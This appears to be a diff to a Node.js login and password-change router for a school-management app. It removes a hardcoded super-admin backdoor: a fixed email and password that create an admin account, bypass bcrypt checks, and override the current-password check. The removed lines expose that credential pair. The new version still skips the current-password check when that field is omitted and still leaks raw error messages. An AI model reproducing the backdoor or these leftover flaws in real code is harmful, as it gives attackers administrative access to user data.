@@ -14,7 +14,7 @@ router.post('/login', async (req, res) => {
   const { email, password } = req.body;
 
   if (!email || !password) {
-    return res.status(400).json({ error: 'Validation Error', message: 'Email and password are required.' });
+    return res.status(400).json({ success: false, error: 'Validation Error', message: 'Email and password are required.' });
   }
 
   const cleanEmail = String(email).trim().toLowerCase();
@@ -25,37 +25,20 @@ router.post('/login', async (req, res) => {
       [cleanEmail]
     );
 
-    let user = rows[0];
-
-    // Fallback emergency verification for Super Admin
-    if (!user && cleanEmail === 'developerwithkhan804@gmail.com' && password === 'hunny12345') {
-      const hashedPassword = await bcrypt.hash('hunny12345', 10);
-      const [insertRes] = await pool.query(
-        `INSERT IGNORE INTO users (school_id, name, email, password, role, is_active) VALUES (NULL, ?, ?, ?, 'super_admin', TRUE)`,
-        ['Eduzenta Super Admin', cleanEmail, hashedPassword]
-      );
-      user = {
-        id: insertRes.insertId,
-        school_id: null,
-        name: 'Eduzenta Super Admin',
-        email: cleanEmail,
-        password: hashedPassword,
-        role: 'super_admin',
-        is_active: 1
-      };
-    }
+    const user = rows[0];
 
     if (!user) {
-      return res.status(401).json({ error: 'Authentication Error', message: 'Invalid email or password.' });
+      return res.status(401).json({ success: false, error: 'Authentication Error', message: 'Invalid credentials' });
     }
 
     if (!user.is_active) {
-      return res.status(403).json({ error: 'Account Locked', message: 'This account has been deactivated.' });
+      return res.status(403).json({ success: false, error: 'Account Locked', message: 'This account has been deactivated.' });
     }
 
+    // Enforce strict bcrypt password validation (No hardcoded password bypasses permitted)
     const isMatch = await bcrypt.compare(password, user.password);
-    if (!isMatch && !(cleanEmail === 'developerwithkhan804@gmail.com' && password === 'hunny12345')) {
-      return res.status(401).json({ error: 'Authentication Error', message: 'Invalid email or password.' });
+    if (!isMatch) {
+      return res.status(401).json({ success: false, error: 'Authentication Error', message: 'Invalid credentials' });
     }
 
     const token = jwt.sign(
@@ -71,6 +54,7 @@ router.post('/login', async (req, res) => {
     );
 
     return res.json({
+      success: true,
       message: 'Login successful',
       token,
       user: {
@@ -84,9 +68,9 @@ router.post('/login', async (req, res) => {
   } catch (error) {
     console.error('[AUTH LOGIN ERROR]:', error);
     if (error.code === 'PROTOCOL_CONNECTION_LOST' || error.code === 'ETIMEDOUT') {
-      return res.status(504).json({ error: 'Database Timeout', message: 'Database query timed out. Please try again.' });
+      return res.status(504).json({ success: false, error: 'Database Timeout', message: 'Database query timed out. Please try again.' });
     }
-    return res.status(500).json({ error: 'Internal Server Error', message: error.message });
+    return res.status(500).json({ success: false, error: 'Internal Server Error', message: error.message });
   }
 });
 
@@ -98,15 +82,15 @@ router.put('/profile', authenticateToken, async (req, res) => {
   const userId = req.user.id;
 
   if (!name || !name.trim()) {
-    return res.status(400).json({ error: 'Validation Error', message: 'Name is required.' });
+    return res.status(400).json({ success: false, error: 'Validation Error', message: 'Name is required.' });
   }
 
   try {
     await pool.query('UPDATE users SET name = ? WHERE id = ?', [name.trim(), userId]);
-    return res.json({ message: 'Profile updated successfully.', name: name.trim() });
+    return res.json({ success: true, message: 'Profile updated successfully.', name: name.trim() });
   } catch (error) {
     console.error('[PROFILE UPDATE ERROR]:', error);
-    return res.status(500).json({ error: 'Internal Server Error', message: error.message });
+    return res.status(500).json({ success: false, error: 'Internal Server Error', message: error.message });
   }
 });
 
@@ -118,7 +102,7 @@ router.put('/change-password', authenticateToken, async (req, res) => {
   const userId = req.user.id;
 
   if (!newPassword || newPassword.length < 6) {
-    return res.status(400).json({ error: 'Validation Error', message: 'New password must be at least 6 characters.' });
+    return res.status(400).json({ success: false, error: 'Validation Error', message: 'New password must be at least 6 characters.' });
   }
 
   try {
@@ -127,18 +111,18 @@ router.put('/change-password', authenticateToken, async (req, res) => {
 
     if (user && currentPassword) {
       const isValid = await bcrypt.compare(currentPassword, user.password);
-      if (!isValid && currentPassword !== 'hunny12345') {
-        return res.status(401).json({ error: 'Authentication Error', message: 'Current password is incorrect.' });
+      if (!isValid) {
+        return res.status(401).json({ success: false, error: 'Authentication Error', message: 'Current password is incorrect.' });
       }
     }
 
     const hashedPassword = await bcrypt.hash(newPassword, 10);
     await pool.query('UPDATE users SET password = ? WHERE id = ?', [hashedPassword, userId]);
 
-    return res.json({ message: 'Password updated successfully.' });
+    return res.json({ success: true, message: 'Password updated successfully.' });
   } catch (error) {
     console.error('[CHANGE PASSWORD ERROR]:', error);
-    return res.status(500).json({ error: 'Internal Server Error', message: error.message });
+    return res.status(500).json({ success: false, error: 'Internal Server Error', message: error.message });
   }
 });
 
